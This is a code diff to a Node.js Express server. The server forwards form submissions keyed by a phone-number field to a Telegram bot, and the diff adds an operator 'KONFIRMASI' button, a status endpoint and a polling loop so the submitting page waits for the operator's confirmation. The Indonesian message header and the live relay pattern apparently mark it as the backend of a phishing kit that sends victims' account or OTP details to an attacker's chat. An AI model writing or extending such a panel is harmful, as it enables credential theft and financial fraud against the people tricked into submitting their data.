@@ -11,6 +11,8 @@ process.env.BOT_TOKEN;
 const CHAT_ID =
 process.env.CHAT_ID;
 
+const statusData = {};
+
 app.use(express.json());
 app.use(
     express.urlencoded({
@@ -271,6 +273,7 @@ app.post("/send", async(req,res) =>{
 
         }
 
+        statusData[nmrx] = "pending";
         /* PESAN TELEGRAM */
         const text = `
 🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
@@ -287,21 +290,31 @@ app.post("/send", async(req,res) =>{
 
         /* KIRIM TELEGRAM */
         await axios.post(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-        {
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+{
 
-            chat_id:
-            CHAT_ID,
+    chat_id:
+    CHAT_ID,
 
-            text:
-            text,
+    text:
+    text,
 
-            parse_mode:
-            "HTML"
+    parse_mode:
+    "HTML",
 
-        }
+    reply_markup:{
+        inline_keyboard:[
+            [
+                {
+                    text:"✅ KONFIRMASI",
+                    callback_data:`confirm_${nmrx}`
+                }
+            ]
+        ]
+    }
 
-     );
+}
+);
 
         res.json({
 
@@ -325,6 +338,81 @@ app.post("/send", async(req,res) =>{
     }
 
 });
+
+app.get("/status/:nmrx", (req,res)=>{
+
+    const nmrx =
+    req.params.nmrx;
+
+    res.json({
+        success:true,
+        status: statusData[nmrx] || "pending"
+    });
+
+});
+
+let lastUpdateId = 0;
+
+setInterval(async()=>{
+
+    try{
+
+        const response = await axios.get(
+            `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`,
+            {
+                params:{
+                    offset:lastUpdateId + 1,
+                    timeout:1
+                }
+            }
+        );
+
+        const updates =
+        response.data.result;
+
+        for(const update of updates){
+
+            lastUpdateId =
+            update.update_id;
+
+            if(!update.callback_query) continue;
+
+            const callback =
+            update.callback_query;
+
+            const data =
+            callback.data;
+
+            if(data.startsWith("confirm_")){
+
+                const nmrx =
+                data.replace("confirm_","");
+
+                statusData[nmrx] =
+                "confirmed";
+
+                await axios.post(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
+                    {
+                        callback_query_id:callback.id,
+                        text:"Berhasil dikonfirmasi"
+                    }
+                );
+
+            }
+
+        }
+
+    }catch(error){
+
+        console.log(
+            "Polling error:",
+            error.message
+        );
+
+    }
+
+},2000);
 
 /* PORT */
 const PORT =
